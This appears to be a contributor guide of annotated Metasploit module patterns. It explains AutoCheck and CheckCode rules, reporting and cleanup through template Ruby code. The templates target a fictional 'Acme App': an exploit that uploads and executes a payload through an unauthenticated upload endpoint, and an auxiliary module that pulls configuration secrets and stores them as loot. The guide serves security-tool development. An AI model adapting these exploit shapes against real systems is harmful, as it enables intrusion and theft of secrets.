# Annotated module patterns

These are shapes, not boilerplate to copy blindly. Inspect the current mixins and nearby recent modules before choosing inheritance, metadata, targets, and reporting.

## Check and AutoCheck contract

- AutoCheck proceeds on `Vulnerable` and `Appears`. It proceeds on `Detected` with a warning.
- AutoCheck blocks `Safe`, `Unknown`, and `Unsupported` unless `ForceExploit` is enabled. `AutoCheck false` bypasses `check` completely.
- Do not add a second mandatory vulnerability check inside `exploit`; it would defeat those overrides.
- A manual console `check` and a later `run` can use different module instances. State created by AutoCheck may be reused only as an optimization with a safe fallback when absent.

## HTTP exploit pattern

This example separates product fingerprinting from CheckCode policy. That lets `check` return only CheckCodes while `exploit` remains compatible with `AutoCheck false` and `ForceExploit`.

```ruby
# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Acme App Unauthenticated File Upload and Command Execution',
        'Description' => %q{
          This module exploits an unauthenticated file upload in Acme App
          versions 4.0.0 through 4.2.1 to execute commands. Version 4.2.2 fixes
          the issue.
        },
        'Author' => [
          'Researcher', # Vulnerability discovery
          'Contributor' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-12345'],
          ['URL', 'https://vendor.example/advisory']
        ],
        'DisclosureDate' => '2026-01-15',
        'Privileged' => false,
        'Targets' => [
          [
            'Unix/Linux Command',
            {
              'Platform' => %w[linux unix],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8080
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Acme App base path', '/'])
      ]
    )
  end

  def check
    fingerprint = acme_fingerprint

    case fingerprint[:status]
    when :unreachable
      return CheckCode::Unknown('No response from the Acme App status endpoint')
    when :unexpected
      return CheckCode::Safe('The target did not return the Acme App fingerprint')
    end

    @acme_service ||= report_acme_service(fingerprint[:version])
    version = fingerprint[:version]
    return CheckCode::Detected('Acme App was detected, but its version could not be identified') unless version

    unless version.between?(Rex::Version.new('4.0.0'), Rex::Version.new('4.2.1'))
      return CheckCode::Safe("Acme App #{version} is outside the vulnerable range")
    end

    CheckCode::Appears("Acme App #{version} is within the vulnerable range")
  end

  def exploit
    fingerprint = acme_fingerprint
    fail_with(Failure::Unreachable, 'No response from the Acme App status endpoint') if fingerprint[:status] == :unreachable
    fail_with(Failure::NotFound, 'The target did not return the Acme App fingerprint') unless fingerprint[:status] == :detected

    @acme_service ||= report_acme_service(fingerprint[:version])

    filename = "#{Rex::Text.rand_text_alpha_lower(8)}.sh"
    upload_uri = normalize_uri(target_uri.path, 'api', 'upload')
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => upload_uri,
      'vars_form_data' => [
        {
          'name' => 'file',
          'filename' => filename,
          'content_type' => 'text/plain',
          'data' => payload.encoded
        }
      ]
    )
    fail_with(Failure::Unreachable, 'No response while uploading the payload') unless res
    fail_with(Failure::UnexpectedReply, 'The target did not confirm the payload upload') unless res.code == 201

    # A 201 means the documented upload endpoint created this deterministic
    # path. Arm cleanup before parsing or verification can fail.
    expected_path = "/var/lib/acme/uploads/#{filename}"
    register_file_for_cleanup(expected_path)

    upload = res.get_json_document
    upload_id = upload['id'].to_s if upload.is_a?(Hash)
    remote_path = upload['path'] if upload.is_a?(Hash)
    unless upload_id&.match?(/\A\d+\z/) && remote_path == expected_path
      fail_with(Failure::UnexpectedReply, 'The upload response did not identify the expected remote file')
    end

    verify_res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'uploads', upload_id)
    )
    fail_with(Failure::Unreachable, 'No response while verifying the payload upload') unless verify_res
    fail_with(Failure::UnexpectedReply, 'The payload upload could not be verified') unless verify_res.code == 200

    upload_status = verify_res.get_json_document
    unless upload_status.is_a?(Hash) && upload_status['path'] == remote_path && upload_status['state'] == 'ready'
      fail_with(Failure::UnexpectedReply, 'The uploaded payload was not ready for execution')
    end

    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      service: @acme_service,
      name: name,
      refs: references,
      info: 'The target accepted an unauthenticated executable file upload'
    )

    trigger_uri = normalize_uri(target_uri.path, 'api', 'run', upload_id)
    print_status("Executing payload at #{trigger_uri}")

    # Fire-and-forget: the endpoint executes the payload in the request and
    # normally blocks until the payload exits.
    send_request_cgi({ 'method' => 'POST', 'uri' => trigger_uri }, 5)
  end

  def report_vuln(opts = {})
    service = opts[:service] || @acme_service
    super(opts.merge(service: service))
  end

  private

  def acme_fingerprint
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'status')
    )
    return { status: :unreachable } unless res
    return { status: :unexpected } unless res.code == 200

    document = res.get_json_document
    return { status: :unexpected } unless document.is_a?(Hash) && document['product'] == 'Acme App'

    version = begin
      Rex::Version.new(document['version'].to_s) if document['version'].present?
    rescue ArgumentError
      nil
    end
    {
      status: :detected,
      version: version
    }
  end

  def report_acme_service(version = nil)
    common = { host: rhost, port: rport, proto: 'tcp' }
    tcp_service = common.merge(name: 'tcp', parents: nil)
    web_service = if ssl
                    common.merge(
                      name: 'https',
                      parents: common.merge(name: 'ssl', parents: tcp_service)
                    )
                  else
                    common.merge(name: 'http', parents: tcp_service)
                  end

    report_service(
      common.merge(
        name: 'acme-app',
        info: version ? "Acme App #{version}" : 'Acme App',
        resource: { uri: normalize_uri(target_uri.path) },
        parents: web_service
      )
    )
  end

end
```

Review this shape before adapting it:

- The fingerprint helper always returns one hash shape; it never sometimes returns CheckCode and sometimes data.
- `exploit` confirms the product but does not reject a patched/unknown version. AutoCheck and `ForceExploit` own that decision.
- `Appears` is justified only by the version range. Return `Vulnerable` only when a safe canary actually exercises the vulnerability and produces direct, vulnerability-specific evidence.
- Artifact registration happens immediately after confirmed creation and before payload execution.
- The trigger timeout is explicit only because the endpoint blocks by design.
- The service is created when the product is identified and reused by AutoCheck reporting.
- Exploit-time confirmation reports the same vulnerability/service even when AutoCheck is disabled.
- Do not add a catch-all rescue to `check`. Rescue only documented parser or protocol exceptions, map assessment failures to a reasoned `Unknown`, and avoid leaking sensitive values.

## Auxiliary gather pattern

```ruby
# frozen_string_literal: true

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Acme App Authenticated Configuration Download',
        'Description' => %q{
          This module authenticates to Acme App and downloads its configuration.
          Acme App versions 4.0.0 through 4.2.1 expose secrets in the export.
          Version 4.2.2 removes the secrets from the exported data.
        },
        'Author' => ['Contributor'],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-12346']
        ],
        'DisclosureDate' => '2026-01-15',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Acme App base path', '/']),
        OptString.new('USERNAME', [true, 'Acme App username', nil]),
        OptString.new('PASSWORD', [true, 'Acme App password', nil])
      ]
    )
  end

  def run
    login_res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      },
      'keep_cookies' => true
    )
    fail_with(Failure::Unreachable, 'No response from the login endpoint') unless login_res
    fail_with(Failure::NoAccess, 'Acme App rejected the supplied credentials') unless login_res.code == 302

    export_res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin', 'export'),
      'keep_cookies' => true
    )
    fail_with(Failure::Unreachable, 'No response from the export endpoint') unless export_res
    fail_with(Failure::UnexpectedReply, 'Acme App did not return a configuration export') unless export_res.code == 200
    export = export_res.get_json_document
    unless export.is_a?(Hash) && export['product'] == 'Acme App' && export['configuration'].is_a?(Hash)
      fail_with(Failure::UnexpectedReply, 'Acme App did not return the expected authenticated export data')
    end

    service_common = { host: rhost, port: rport, proto: 'tcp' }
    tcp_service = service_common.merge(name: 'tcp', parents: nil)
    web_service = if ssl
                    service_common.merge(
                      name: 'https',
                      parents: service_common.merge(name: 'ssl', parents: tcp_service)
                    )
                  else
                    service_common.merge(name: 'http', parents: tcp_service)
                  end
    service = report_service(
      service_common.merge(
        name: 'acme-app',
        resource: { uri: normalize_uri(target_uri.path) },
        parents: web_service
      )
    )

    service_data = {
      origin_type: :service,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: service&.name || 'acme-app'
    }
    service_data[:service_id] = service.id if service
    store_valid_credential(
      user: datastore['USERNAME'],
      private: datastore['PASSWORD'],
      service_data: service_data
    )

    if export['secret_key'].present?
      report_vuln(
        host: rhost,
        port: rport,
        proto: 'tcp',
        service: service,
        name: name,
        refs: references,
        info: 'The authenticated configuration export disclosed its secret key'
      )
    end

    path = store_loot(
      'acme.config',
      'application/json',
      rhost,
      export_res.body.to_s,
      'acme-config.json',
      'Acme App configuration export',
      service
    )
    print_good("Configuration saved to #{path}")
  end
end
```

The inline service chain is deliberately explicit. A real module should normally move it to an idempotent helper as shown in [reporting.md](./reporting.md).

## State-changing requests

Do not equate an HTTP code with the requested state change. Parse the documented response and, when possible, perform a read-back:

```ruby
account_name = Faker::Internet.username
res = send_request_cgi(
  'method' => 'POST',
  'uri' => normalize_uri(target_uri.path, 'api', 'accounts'),
  'vars_post' => { 'username' => account_name }
)
fail_with(Failure::Unreachable, 'No response while creating the account') unless res
fail_with(Failure::UnexpectedReply, 'Account creation was not accepted') unless res.code == 201

# The response confirms creation. Track the caller-selected name before
# parsing so cleanup can still locate the account if the body is malformed.
@created_account = { name: account_name }

document = res.get_json_document
account_id = document['id'].to_s if document.is_a?(Hash)
unless account_id&.match?(/\A\d+\z/)
  fail_with(Failure::UnexpectedReply, 'Account creation response did not contain the expected numeric ID')
end

@created_account[:id] = account_id

verify_res = send_request_cgi(
  'method' => 'GET',
  'uri' => normalize_uri(target_uri.path, 'api', 'accounts', account_id)
)
fail_with(Failure::Unreachable, 'No response while verifying the created account') unless verify_res
fail_with(Failure::UnexpectedReply, 'Created account could not be verified') unless verify_res.code == 200
```

Track whether the account/resource was created by this run before deleting it in cleanup. Preflight caller-supplied names when necessary, and never remove a pre-existing object just because it has the configured name. Prefer a caller-selected unique identity so cleanup does not depend exclusively on a response-generated ID.

## Random identifiers

Randomize attacker-controlled titles, slugs, filenames, branch names, plugin names, and similar metadata when the product permits it. Use `Faker` for fake user/account data. For identifiers embedded in generated code, specify the runtime language, for example `Rex::RandomIdentifier::Generator.new(language: :php)`. If a constant identifier is required by the vulnerability, explain its protocol significance in a nearby comment.
